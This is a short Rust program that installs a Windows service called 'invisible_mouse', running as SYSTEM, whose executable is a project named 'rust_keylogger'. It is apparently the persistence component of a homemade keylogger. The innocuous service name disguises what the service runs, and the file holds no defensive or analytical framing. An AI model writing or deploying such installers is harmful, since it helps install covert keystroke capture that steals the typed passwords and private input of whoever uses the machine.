use std::ffi::OsString;
use std::path::PathBuf;
use windows_service::service::{
    ServiceAccess, 
    ServiceErrorControl, 
    ServiceInfo, 
    ServiceStartType, 
    ServiceType,
};
use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};

fn main() -> windows_service::Result<()> {
    println!("Installing invisible_mouse service");

    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CREATE_SERVICE)?;

    let service_info = ServiceInfo {
        name: OsString::from("invisible_mouse"),
        display_name: OsString::from("invisible_mouse"),

        service_type: ServiceType::OWN_PROCESS,
        start_type: ServiceStartType::OnDemand,
        error_control: ServiceErrorControl::Normal,
        executable_path: PathBuf::from("C:/Users/mremond/Documents/DevProjects/Rust/rust_keylogger/target/debug/rust_keylogger.exe"),
        launch_arguments: vec![],
        dependencies: vec![],

        account_name: None, // Run as System
        account_password: None,
    };

    let _service = manager.create_service(&service_info, ServiceAccess::QUERY_STATUS)?;

    println!("Installation succeeded");

    Ok(())
}
